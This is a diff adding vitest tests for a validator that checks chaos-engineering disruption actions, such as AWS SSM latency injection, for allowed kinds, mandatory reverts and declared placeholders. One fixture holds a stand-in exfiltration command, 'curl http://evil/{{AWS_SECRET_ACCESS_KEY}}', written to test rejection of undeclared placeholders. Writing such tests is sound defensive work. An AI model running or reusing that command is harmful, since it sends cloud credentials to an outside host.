@@ -3,6 +3,10 @@ import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
+import {
+  checkDisruptionActionOutputRefs,
+  checkDisruptionActions,
+} from "../../../scripts/lib/disruption-action-check";
 import { checkCoordinationPluginFile } from "../../../scripts/validate-problems";
 
 /**
@@ -121,5 +125,139 @@ describe("checkCoordinationPluginFile content scan (ADR-030 S1 #1420)", () => {
     expect(joined).toContain("process.env access");
     expect(joined).toContain("fetch() call");
     expect(errs).toHaveLength(3);
+  });
+});
+
+describe("checkDisruptionActions (ADR-031 #1419)", () => {
+  const wellFormed = () => ({
+    disruptions: [
+      {
+        id: "ec2-latency-injection",
+        name: "latency",
+        eventDetailType: "DegradedDisruptionFired",
+        operatorEditable: ["afterMinutes"],
+        parameters: { delayMs: 200, device: "eth0" },
+        action: {
+          kind: "ssm-run-command",
+          targetRef: "WorkerInstanceIds",
+          documentName: "AWS-RunShellScript",
+          paramTemplate: {
+            commands: ["tc qdisc add dev {{device}} root netem delay {{delayMs}}ms"],
+          },
+          revert: { afterSeconds: 600 },
+        },
+      },
+    ],
+  });
+
+  it("should pass a well-formed action whose placeholders are all declared", () => {
+    expect(checkDisruptionActions(wellFormed())).toEqual([]);
+  });
+
+  it("should be a no-op when a disruption declares no action (Phase A backward compat)", () => {
+    expect(
+      checkDisruptionActions({
+        disruptions: [{ id: "x", name: "x", eventDetailType: "X" }],
+      }),
+    ).toEqual([]);
+    expect(checkDisruptionActions({})).toEqual([]);
+  });
+
+  it("should reject a kind outside the allow-list", () => {
+    const meta = wellFormed();
+    meta.disruptions[0].action.kind = "rm-rf-everything";
+    const errs = checkDisruptionActions(meta);
+    expect(errs.some((e) => e.includes("action.kind must be one of"))).toBe(true);
+  });
+
+  it("should reject a missing / empty targetRef", () => {
+    const meta = wellFormed();
+    meta.disruptions[0].action.targetRef = "";
+    expect(checkDisruptionActions(meta).some((e) => e.includes("targetRef"))).toBe(true);
+  });
+
+  it("should require a revert (ADR-029 INV-2: no disruption may be permanent)", () => {
+    const meta = wellFormed();
+    meta.disruptions[0].action.revert = undefined as unknown as { afterSeconds: number };
+    const errs = checkDisruptionActions(meta);
+    expect(errs.some((e) => e.includes("revert is required") && e.includes("INV-2"))).toBe(true);
+  });
+
+  it("should reject a non-positive or over-cap revert.afterSeconds", () => {
+    const zero = wellFormed();
+    zero.disruptions[0].action.revert = { afterSeconds: 0 };
+    expect(
+      checkDisruptionActions(zero).some((e) => e.includes("afterSeconds must be a positive")),
+    ).toBe(true);
+    const tooLong = wellFormed();
+    tooLong.disruptions[0].action.revert = { afterSeconds: 24 * 60 * 60 + 1 };
+    expect(checkDisruptionActions(tooLong).some((e) => e.includes("exceeds the"))).toBe(true);
+  });
+
+  it("should reject a paramTemplate placeholder not declared in parameters / operatorEditable", () => {
+    const meta = wellFormed();
+    meta.disruptions[0].action.paramTemplate = {
+      commands: ["curl http://evil/{{AWS_SECRET_ACCESS_KEY}}"],
+    };
+    const errs = checkDisruptionActions(meta);
+    expect(errs.some((e) => e.includes("{{AWS_SECRET_ACCESS_KEY}}"))).toBe(true);
+  });
+
+  it("should also scan revert.paramTemplate placeholders", () => {
+    const meta = wellFormed();
+    meta.disruptions[0].action.revert = {
+      afterSeconds: 600,
+      paramTemplate: { commands: ["echo {{undeclaredRevertKey}}"] },
+    } as unknown as { afterSeconds: number };
+    expect(checkDisruptionActions(meta).some((e) => e.includes("{{undeclaredRevertKey}}"))).toBe(
+      true,
+    );
+  });
+
+  it("should reject a non-object action", () => {
+    const errs = checkDisruptionActions({
+      disruptions: [{ id: "x", name: "x", eventDetailType: "X", action: "nope" }],
+    });
+    expect(errs.some((e) => e.includes("action must be an object"))).toBe(true);
+  });
+});
+
+describe("checkDisruptionActionOutputRefs (ADR-031 #1419)", () => {
+  const meta = {
+    disruptions: [
+      {
+        id: "ec2-latency-injection",
+        action: {
+          kind: "ssm-run-command",
+          targetRef: "WorkerInstanceIds",
+          functionRef: "FaultFunctionName",
+          revert: { afterSeconds: 600 },
+        },
+      },
+    ],
+  };
+
+  it("should pass when targetRef + functionRef are present in template Outputs", () => {
+    const yaml =
+      "Outputs:\n  WorkerInstanceIds:\n    Value: x\n  FaultFunctionName:\n    Value: y\n";
+    expect(checkDisruptionActionOutputRefs(meta, yaml, "template.yaml")).toEqual([]);
+  });
+
+  it("should report a targetRef that is not a CFn Output", () => {
+    const yaml = "Outputs:\n  FaultFunctionName:\n    Value: y\n";
+    const errs = checkDisruptionActionOutputRefs(meta, yaml, "template.yaml");
+    expect(errs).toHaveLength(1);
+    expect(errs[0]).toContain('targetRef="WorkerInstanceIds"');
+  });
+
+  it("should be a no-op when no disruption declares an action", () => {
+    expect(
+      checkDisruptionActionOutputRefs(
+        { disruptions: [{ id: "x" }] },
+        "Outputs:\n",
+        "template.yaml",
+      ),
+    ).toEqual([]);
+    expect(checkDisruptionActionOutputRefs({}, "Outputs:\n", "template.yaml")).toEqual([]);
   });
 });
